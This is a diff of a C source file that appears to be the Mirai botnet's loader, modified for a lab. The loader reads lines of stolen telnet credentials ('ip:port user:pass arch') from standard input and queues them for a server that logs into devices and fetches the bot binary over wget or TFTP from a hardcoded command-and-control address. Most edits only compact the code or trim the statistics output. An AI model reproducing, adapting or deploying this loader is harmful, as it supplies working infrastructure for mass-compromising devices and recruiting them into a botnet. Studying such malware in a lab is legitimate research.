@@ -2,9 +2,9 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
-#include <unistd.h>
 #include <pthread.h>
 #include <sys/socket.h>
+#include <arpa/inet.h>
 #include <errno.h>
 #include "headers/includes.h"
 #include "headers/server.h"
@@ -13,9 +13,7 @@
 #include "headers/util.h"
 
 static void *stats_thread(void *);
-
 static struct server *srv;
-
 char *id_tag = "telnet";
 
 int main(int argc, char **args)
@@ -26,17 +24,12 @@ int main(int argc, char **args)
     uint32_t total = 0;
     struct telnet_info info;
 
-    // ========== MODIFIED FOR LAB ==========
-    // Use only one bind address - your CNC IP
+    // Modified for lab
     addrs_len = 1;
     addrs = calloc(addrs_len, sizeof(ipv4_t));
-    addrs[0] = inet_addr("172.16.193.190");  // Your CNC VM IP
-    // ======================================
+    addrs[0] = inet_addr("172.16.193.190");
 
-    if (argc == 2)
-    {
-        id_tag = args[1];
-    }
+    if (argc == 2) id_tag = args[1];
 
     if (!binary_init())
     {
@@ -44,11 +37,9 @@ int main(int argc, char **args)
         return 1;
     }
 
-    // ========== MODIFIED FOR LAB ==========
-    // wget and tftp server IP = your CNC VM IP
+    // Modified for lab
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, 
             "172.16.193.190", 80, "172.16.193.190")) == NULL)
-    // ======================================
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
@@ -56,59 +47,37 @@ int main(int argc, char **args)
 
     pthread_create(&stats_thrd, NULL, stats_thread, NULL);
 
-    // Read from stdin
     while (TRUE)
     {
         char strbuf[1024];
-
-        if (fgets(strbuf, sizeof(strbuf), stdin) == NULL)
-            break;
-
+        if (fgets(strbuf, sizeof(strbuf), stdin) == NULL) break;
         util_trim(strbuf);
-
-        if (strlen(strbuf) == 0)
-        {
-            usleep(10000);
-            continue;
-        }
+        if (strlen(strbuf) == 0) { usleep(10000); continue; }
 
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) == NULL)
-            printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
+            printf("Failed to parse telnet info: \"%s\"\n", strbuf);
         else
         {
-            if (srv == NULL)
-                printf("srv == NULL 2\n");
-
             server_queue_telnet(srv, &info);
-            if (total++ % 1000 == 0)
-                sleep(1);
+            if (total++ % 1000 == 0) sleep(1);
         }
-
         ATOMIC_INC(&srv->total_input);
     }
 
     printf("Hit end of input.\n");
-
-    while(ATOMIC_GET(&srv->curr_open) > 0)
-        sleep(1);
-
+    while(ATOMIC_GET(&srv->curr_open) > 0) sleep(1);
     return 0;
 }
 
 static void *stats_thread(void *arg)
 {
     uint32_t seconds = 0;
-
     while (TRUE)
     {
-#ifndef DEBUG
-        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
-               seconds++, ATOMIC_GET(&srv->total_input), ATOMIC_GET(&srv->curr_open), 
-               ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
-               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), 
-               ATOMIC_GET(&srv->total_tftps));
-#endif
+        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\n",
+               seconds++, ATOMIC_GET(&srv->total_input), ATOMIC_GET(&srv->curr_open),
+               ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes));
         fflush(stdout);
         sleep(1);
     }
